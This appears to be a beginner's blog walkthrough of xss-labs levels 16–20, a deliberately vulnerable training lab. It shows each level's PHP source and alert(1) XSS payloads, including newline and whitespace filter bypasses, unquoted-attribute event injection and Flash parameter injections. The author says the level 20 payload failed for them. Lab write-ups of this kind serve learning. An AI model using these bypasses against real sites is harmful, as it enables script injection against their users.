---
title: "Xss-labs Full Walkthrough & XSS Notes04"
publishDate: 2025-12-26 16:49:00
description: "Analysis and Notes"
tags: ["XSS", "Notes", "Web"]
language: "English"

---

> Notes compiled by a beginner for learning and reference. I am not a professional; please forgive any oversights. Acknowledgments to others and AI assistance where applicable.
> 
> I chose to present the source code directly (normally you cannot see the full backend source, only the page source). On one hand, this saves space used by trial-and-error payloads; on the other hand, it makes it more intuitive for future review without needing to run other tools. I believe most filtering methods can be discovered through testing—just try a few more times. (Okay, actually, I don't think anyone else will read this; it's mostly for my own review)

## Level 16

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script"," ",$str);
$str3=str_replace(" "," ",$str2);
$str4=str_replace("/"," ",$str3);
$str5=str_replace("    "," ",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>


```

1.From source code analysis, we know this level prevents case sensitivity bypass, usage of `script`, and even (space) is translated to `&nbsp`.

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script"," ",$str);
$str3=str_replace(" "," ",$str2);
$str4=str_replace("/"," ",$str3);
$str5=str_replace("    "," ",$str4);
```

Since `<script>` is not allowed, let's use `<img>`, `<svg>`, `<body>`, etc., but what about the spaces in between?

2.HTML parsing is very tolerant. Besides **Space (%20)**, it recognizes other "whitespace characters" as separators. If space is banned, and Tab is banned, we still have:

* **Carriage Return (CR)** -> URL encoded as `%0d`

* **Line Feed (LF)** -> URL encoded as `%0a`

So, our strategy is: **Use `%0a` or `%0d` instead of space to separate tag attributes.**

3.So we can construct the classic `<img>`:

```html
keyword=<img%0asrc=x%0aonerror=alert(1)>
```

Or use other methods from [Tag Escape](#tag-escape).

### Space Bypass Cheat Sheet

| **Character Name**       | **URL Encoding** | **Fate in Level 16** | **Real World Status**  | **Principle Analysis**                                                                                               |
| ------------------------ | ---------------- | -------------------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **Space**                | `%20`            | **Killed**           | Cannon Fodder          | Standard space. Because it's standard, it's the first thing WAF cuts. This problem replaces it with empty, unusable. |
| **Tab**                  | `%09`            | **Killed**           | Substitute             | Tab key. Many lazy devs only filter `%20` and forget `%09`, but this author blocked it too.                          |
| **Line Feed (LF)**       | `%0a`            | **✅ Alive (MVP)**    | **Invisible Assassin** | Linux system newline. Browser treats it as space, but PHP code didn't filter it. **This is the solution**.           |
| **Carriage Return (CR)** | `%0d`            | **✅ Alive (MVP)**    | **Backup**             | Windows return first half. Same breed as `%0a`, works for this level too.                                            |
| **Slash**                | `/`              | **Killed**           | **God Like**           | Divine skill. `<img/src=x>` needs no whitespace at all. Sadly blocked here, otherwise this is the sleekest.          |
| **Form Feed (FF)**       | `%0c`            | Luck Dependent       | Psycho                 | Extremely rare character. Only older browsers or specific environments recognize it. Try your luck as a last resort. |
| **Vertical Tab**         | `%0b`            | Luck Dependent       | Psycho #2              | Same as above, dead horse as live doctor option.                                                                     |

## Level 17

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！"); 
}
</script>
<title>欢迎来到level17</title>
</head>
<body>
<h1 align=center>欢迎来到level17</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
</body>
</html>
```

1.It tests not Flash vulnerabilities, but a **classic logic of HTML parsing**, so it doesn't matter if Flash is broken.

2.Core Code

```php
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

Bad news, it's filtered, many things can't be used. Good news, `src=xsf01.swf?...`. **No quotes! No quotes! No quotes!**

In HTML syntax, if an attribute value is not wrapped in quotes, how does the browser know where it ends? **Answer: It ends when it encounters a space.**

3.So we can use `arg02` to construct:

```
level17.php?arg01=a&arg02=b%20onmouseover=alert(1)
```

We fill `arg01` with whatever `a`. In `arg02` we fill: `b onmouseover=alert(1)`

## Level 18

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level19.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level18</title>
</head>
<body>
<h1 align=center>欢迎来到level18</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
</body>
</html>

```

1.No difference from 17, payload same as 17.

```
level18.php?arg01=a&arg02=b%20onmouseover=alert(1)
```

## Level 19

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level20.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level19</title>
</head>
<body>
<h1 align=center>欢迎来到level19</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>


```

1.This level fixed the biggest issue from above: `"`

This level requires Flash injection. But modern browsers can't use Flash, so what to do?

You can use `Ruffle`, a browser extension, very simple (but sometimes the bugs are fixed too well so Flash exploits don't work).

Or find a specialized "Zombie Browser".

2.To parse `xsf03.swf` we must use another tool `JPEXS`. The `sIFR` file is too long so I won't show it (just glossing over it, haven't fully mastered Flash reverse engineering).

This `xsf03.swf` is an old actor. Its ActionScript logic is roughly:

1. * It accepts a parameter named `version`.
   
   * It assigns this parameter directly to the `htmlText` property of a text box.
   
   * Flash's `htmlText` supports limited HTML tags, including the `<a>` tag (hyperlink).

This makes it easy. We just construct an `<a>` tag with `javascript:` pseudo-protocol, pass it to the `version` parameter, and then click the generated link in Flash to trigger JS.

3.We can construct:

```
level19.php?arg01=version&arg02=<a href="javascript:alert(1)">快点我拿flag</a>
```

Here we utilize a rule of browser HTML rendering: **When parsing HTML attribute values (like src, href, value), it automatically performs "HTML Entity Decoding".** So it works even if escaped.

## Level 20

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level21.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level20</title>
</head>
<body>
<h1 align=center>欢迎来到level20</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>


```

1.This `xsf04.swf` is a component called **ZeroClipboard** (early version). Its function is to help webpages implement "Copy to Clipboard". Internally it uses `ExternalInterface.call` to call browser JavaScript functions. Its ActionScript logic is roughly as follows (simplified):

```php
// Get passed id parameter
var id = loaderInfo.parameters.id;
// Call JS, construct code similar to this:
ExternalInterface.call("ZeroClipboard.dispatch", id, "mouseOut", null);
```

Or in the generated JS, it gets spliced into a string: `try { __flash__toXML(ZeroClipboard.dispatch("YOUR_ID")); } catch (e) { ... }`

**Vulnerability Point:** When Flash splices this JS code, it doesn't correctly handle the `id` parameter we passed. If we pass specific characters, we can close the original quotes and brackets and insert our own JS code.

3. We need to do two things:

4. **Parameter Name (`arg01`)**: Must be the predefined parameter name in Flash, here it is `id`.

5. **Parameter Value (`arg02`)**: Needs to close the JS statement constructed by Flash.

**Construct Payload:** Usually the standard payload for this level is `\"))alert(1)//`.

* `\"`: The backslash here is usually to escape possible internal escaping in Flash, or combine with double quotes to close the string.

* `))`: Close the preceding function call brackets.

* `alert(1)`: Execute our code.

* `//`: Comment out the remaining original JS code to prevent syntax errors.

```php
level20.php?arg01=id&arg02=\"))alert(1)//
```

Regrettably, I don't know why I couldn't trigger it. Below is an expert analysis attached:

> [XSS LABS - Level 20 过关思路_xss-lab20-CSDN博客](https://blog.csdn.net/m0_73360524/article/details/141619635)


